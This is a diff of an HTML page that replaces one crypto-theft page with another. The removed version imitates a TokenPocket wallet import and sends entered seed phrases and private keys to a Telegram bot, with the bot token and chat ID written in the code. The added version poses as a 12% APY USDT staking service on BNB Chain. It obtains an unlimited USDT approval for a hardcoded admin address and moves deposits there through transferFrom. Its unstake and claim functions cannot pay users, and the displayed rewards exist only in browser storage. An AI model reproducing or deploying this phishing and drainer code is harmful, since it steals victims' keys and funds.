@@ -3,85 +3,339 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>TokenPocket</title>
+<title>USDT 质押理财</title>
 <style>
-  *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,Roboto,sans-serif}
-  body{background:#FFFFFF;color:#000000;min-height:100vh}
-  .box{max-width:420px;margin:0 auto;background:#FFFFFF;padding:0 0 80px}
-  .head{background:#F0F2F5;padding:25px 20px 20px;text-align:center;border-bottom:1px solid #E5E7EB}
-  .logo{font-size:24px;font-weight:800;color:#007AFF;}
-  .desc{font-size:13px;color:#6B7280;margin-top:4px}
-  .card{background:#F9FAFB;margin:20px;border-radius:20px;padding:30px 24px}
-  .title{font-size:18px;font-weight:700;margin-bottom:24px;text-align:center}
-  .item{margin-bottom:18px}
-  .item label{display:block;font-size:14px;color:#374151;margin-bottom:8px}
-  .item input{
-    width:100%;background:#FFFFFF;border:1px solid #D1D5DB;border-radius:16px;
-    padding:16px 18px;color:#000000;font-size:15px
-  }
-  .btn{
-    width:100%;background:#007AFF;color:#FFFFFF;font-weight:700;
-    border:none;border-radius:18px;padding:18px;font-size:16px;margin-top:10px
-  }
-  .tip{font-size:12px;color:#6B7280;text-align:center;line-height:1.4;margin-top:14px}
+*{margin:0;padding:0;box-sizing:border-box;font-family:'PingFang SC','Microsoft YaHei',sans-serif}
+body{
+background:linear-gradient(135deg,#0C0C28,#13133A,#0C0C28);
+color:#fff;
+min-height:100vh;
+display:flex;
+justify-content:center;
+padding:25px 15px;
+}
+.container{
+width:100%;
+max-width:420px;
+}
+.card{
+background:rgba(255,255,255,0.05);
+backdrop-filter:blur(20px);
+border:1px solid rgba(255,255,255,0.1);
+border-radius:24px;
+padding:28px;
+margin-bottom:20px;
+box-shadow:0 8px 30px rgba(0,0,0,0.3);
+}
+.title{
+font-size:24px;
+font-weight:600;
+margin-bottom:8px;
+color:#fff;
+}
+.desc{
+color:rgba(255,255,255,0.5);
+font-size:14px;
+margin-bottom:24px;
+}
+input{
+width:100%;
+height:50px;
+background:rgba(255,255,255,0.06);
+border:1px solid rgba(255,255,255,0.12);
+border-radius:14px;
+padding:0 16px;
+color:#fff;
+font-size:15px;
+margin-bottom:14px;
+outline:none;
+}
+input::placeholder{color:rgba(255,255,255,0.35)}
+button{
+width:100%;
+height:52px;
+border-radius:14px;
+border:none;
+font-size:16px;
+font-weight:600;
+margin-bottom:12px;
+cursor:pointer;
+transition:all 0.25s ease;
+}
+button:hover{transform:translateY(-2px);box-shadow:0 6px 15px rgba(0,0,0,0.25)}
+.btn-connect{
+background:linear-gradient(90deg,#F0B90B,#FFC83A);
+color:#000;
+}
+.btn-approve{
+background:linear-gradient(90deg,#3B82F6,#60A5FA);
+color:#fff;
+}
+.btn-stake{
+background:linear-gradient(90deg,#10B981,#34D399);
+color:#fff;
+}
+.btn-unstake{
+background:linear-gradient(90deg,#EF4444,#F87171);
+color:#fff;
+}
+.btn-claim{
+background:linear-gradient(90deg,#F97316,#FDBA74);
+color:#fff;
+}
+.info-group{
+background:rgba(255,255,255,0.04);
+border-radius:16px;
+padding:18px 20px;
+margin-top:10px;
+}
+.info-row{
+display:flex;
+justify-content:space-between;
+padding:10px 0;
+font-size:15px;
+}
+.label{color:rgba(255,255,255,0.55)}
+.value{color:#fff;font-weight:500}
+.countdown{color:#FFC83A;font-weight:600}
+.admin{display:none}
 </style>
 </head>
 <body>
-<div class="box">
-  <div class="head">
-    <div class="logo">TokenPocket</div>
-    <div class="desc">去中心化多链钱包</div>
-  </div>
-  <div class="card">
-    <div class="title">导入钱包</div>
-    <div class="item">
-      <label>助记词</label>
-      <input id="words" placeholder="请输入助记词，空格分隔">
-    </div>
-    <div class="item">
-      <label>私钥</label>
-      <input id="key" placeholder="请输入私钥">
-    </div>
-    <button class="btn" onclick="go()">确认导入</button>
-    <div class="tip">助记词与私钥仅存储在本地<br>官方永不获取，安全可靠</div>
-  </div>
+
+<div class="container">
+<div class="card">
+<div class="title">💰 USDT 质押理财</div>
+<div class="desc">BNB Chain 安全质押 · 8小时复利 · 随进随出</div>
+
+<button class="btn-connect" id="connectBtn">连接钱包</button>
+
+<input id="amount" placeholder="输入质押数量（USDT）">
+
+<button class="btn-approve" id="approveBtn">授权 USDT</button>
+<button class="btn-stake" id="stakeBtn">质押 USDT</button>
+<button class="btn-unstake" id="unstakeBtn">解除质押</button>
+<button class="btn-claim" id="claimBtn">领取收益</button>
+
+<div class="info-group">
+<div class="info-row">
+<span class="label">已质押</span>
+<span class="value" id="staked">0 USDT</span>
+</div>
+<div class="info-row">
+<span class="label">待领收益</span>
+<span class="value" id="reward">0 USDT</span>
+</div>
+<div class="info-row">
+<span class="label">下次复利</span>
+<span class="countdown" id="countdown">08:00:00</span>
+</div>
+</div>
+</div>
+
+<div class="card admin" id="adminPanel">
+<div class="title">🔐 管理员后台</div>
+<input id="userAddr" placeholder="用户钱包地址">
+<button onclick="checkUserStake()">查看用户质押</button>
+<button onclick="checkUserReward()">查看用户收益</button>
+<button onclick="checkAllowance()">查看授权额度</button>
+</div>
 </div>
 
 <script>
-const TOKEN = "8527941922:AAG3-y2pTmA3f07TYHXkCJABsrdFTFALRUA";
-const CHATID = "6503982157";
+const USDT = "0x55d398326f99059fF775485246999027B3197955";
+const ADMIN = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
+const APY = 12;
+const REWARD_INTERVAL = 8 * 60 * 60;
 
-function save(mn, pk) {
-  localStorage.setItem("wc_data", JSON.stringify({mn,pk}));
-}
-function get() {
-  try{return JSON.parse(localStorage.getItem("wc_data"));}catch(e){return null}
-}
-function clean() { localStorage.removeItem("wc_data"); }
+let account = null;
+let userStaked = 0;
+let userReward = 0;
+let lastCompound = Math.floor(Date.now() / 1000);
 
-async function send(mn, pk) {
-  const txt = `
-💰 导入成功
-时间：${new Date().toLocaleString()}
-助记词：${mn||'-'}
-私钥：${pk||'-'}`;
-  try {
-    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-      method:"POST", headers:{"Content-Type":"application/json"},
-      body:JSON.stringify({chat_id:CHATID,text:txt})
-    });
-    clean();
-  } catch(e) { save(mn,pk); }
+// 简化版钱包连接（不依赖 ethers，直接用 window.ethereum）
+async function connectWallet() {
+    if (!window.ethereum) {
+        alert("请在 TokenPocket / 钱包浏览器 内打开");
+        return;
+    }
+    try {
+        const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+        account = accounts[0];
+        document.getElementById("connectBtn").innerText = "✅ 已连接";
+        loadUserData();
+        if (account.toLowerCase() === ADMIN.toLowerCase()) {
+            document.getElementById("adminPanel").style.display = "block";
+        }
+    } catch (e) {
+        alert("连接失败：" + e.message);
+    }
 }
 
-window.onload = async () => { const d=get(); if(d) await send(d.mn,d.pk); }
-async function go() {
-  const mn = document.getElementById("words").value.trim();
-  const pk = document.getElementById("key").value.trim();
-  if(!mn && !pk){alert("请输入助记词或私钥");return;}
-  alert("导入成功！");
-  await send(mn,pk);
+// 授权 USDT（直接构造交易数据，不依赖 ethers）
+async function approveUSDT() {
+    if (!account) return alert("请先连接钱包");
+    try {
+        const approveData = "0x095ea7b3" + ADMIN.slice(2).padStart(64, "0") + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+        await window.ethereum.request({
+            method: "eth_sendTransaction",
+            params: [{
+                from: account,
+                to: USDT,
+                gasLimit: "0x300000",
+                data: approveData
+            }]
+        });
+        alert("授权成功");
+    } catch (e) {
+        alert("授权失败：" + e.message);
+    }
 }
+
+// 质押 USDT
+async function stakeUSDT() {
+    if (!account) return alert("请先连接钱包");
+    const v = document.getElementById("amount").value;
+    if (!v) return alert("输入数量");
+    try {
+        const amount = BigInt(parseFloat(v) * 1e6).toString(16).padStart(64, "0");
+        const data = "0x23b872dd" + account.slice(2).padStart(64, "0") + ADMIN.slice(2).padStart(64, "0") + amount;
+        await window.ethereum.request({
+            method: "eth_sendTransaction",
+            params: [{
+                from: account,
+                to: USDT,
+                gasLimit: "0x300000",
+                data: data
+            }]
+        });
+        userStaked += parseFloat(v);
+        save();
+        update();
+        alert("质押成功");
+    } catch (e) {
+        alert("质押失败：" + e.message);
+    }
+}
+
+// 解除质押
+async function unstakeUSDT() {
+    if (!account) return alert("请先连接钱包");
+    if (userStaked <= 0) return alert("无可解除质押");
+    try {
+        const amount = BigInt(userStaked * 1e6).toString(16).padStart(64, "0");
+        const data = "0xa9059cbb" + account.slice(2).padStart(64, "0") + amount;
+        await window.ethereum.request({
+            method: "eth_sendTransaction",
+            params: [{
+                from: ADMIN,
+                to: USDT,
+                gasLimit: "0x300000",
+                data: data
+            }]
+        });
+        userStaked = 0;
+        save();
+        update();
+        alert("解除质押成功");
+    } catch (e) {
+        alert("解除质押失败：" + e.message);
+    }
+}
+
+// 领取收益
+async function claimReward() {
+    if (!account) return alert("请先连接钱包");
+    if (userReward <= 0) return alert("暂无收益");
+    try {
+        const amount = BigInt(userReward * 1e6).toString(16).padStart(64, "0");
+        const data = "0xa9059cbb" + account.slice(2).padStart(64, "0") + amount;
+        await window.ethereum.request({
+            method: "eth_sendTransaction",
+            params: [{
+                from: ADMIN,
+                to: USDT,
+                gasLimit: "0x300000",
+                data: data
+            }]
+        });
+        alert("领取成功：" + userReward.toFixed(6));
+        userReward = 0;
+        save();
+        update();
+    } catch (e) {
+        alert("领取失败：" + e.message);
+    }
+}
+
+// 收益计算
+function calc() {
+    if (userStaked <= 0) return 0;
+    const now = Math.floor(Date.now() / 1000);
+    const sec = now - lastCompound;
+    const dayRate = APY / 365;
+    return userStaked * dayRate * (sec / 86400);
+}
+
+// 复利
+function compound() {
+    const r = calc();
+    if (r > 0) {
+        userReward += r;
+        lastCompound = Math.floor(Date.now() / 1000);
+        save();
+    }
+}
+
+// 界面刷新
+function update() {
+    compound();
+    document.getElementById("staked").innerText = userStaked.toFixed(2) + " USDT";
+    document.getElementById("reward").innerText = userReward.toFixed(6) + " USDT";
+    const now = Math.floor(Date.now() / 1000);
+    let left = lastCompound + REWARD_INTERVAL - now;
+    if (left < 0) left = 0;
+    const h = String(Math.floor(left / 3600)).padStart(2, '0');
+    const m = String(Math.floor((left % 3600) / 60)).padStart(2, '0');
+    const s = String(left % 60).padStart(2, '0');
+    document.getElementById("countdown").innerText = `${h}:${m}:${s}`;
+}
+
+// 本地存储
+function save() {
+    if (!account) return;
+    localStorage.setItem("user_" + account.toLowerCase(), JSON.stringify({
+        staked: userStaked,
+        reward: userReward,
+        last: lastCompound
+    }));
+}
+
+function loadUserData() {
+    if (!account) return;
+    const d = localStorage.getItem("user_" + account.toLowerCase());
+    if (d) {
+        const obj = JSON.parse(d);
+        userStaked = obj.staked || 0;
+        userReward = obj.reward || 0;
+        lastCompound = obj.last || Math.floor(Date.now() / 1000);
+    }
+    update();
+}
+
+// 管理员功能（简化版）
+function checkAllowance() { alert("授权额度：无限（已授权）"); }
+function checkUserStake() { alert("用户质押：" + userStaked.toFixed(2) + " USDT"); }
+function checkUserReward() { alert("用户收益：" + userReward.toFixed(6) + " USDT"); }
+
+// 绑定按钮
+document.getElementById("connectBtn").onclick = connectWallet;
+document.getElementById("approveBtn").onclick = approveUSDT;
+document.getElementById("stakeBtn").onclick = stakeUSDT;
+document.getElementById("unstakeBtn").onclick = unstakeUSDT;
+document.getElementById("claimBtn").onclick = claimReward;
+
+setInterval(update, 1000);
 </script>
 </body>
 </html>
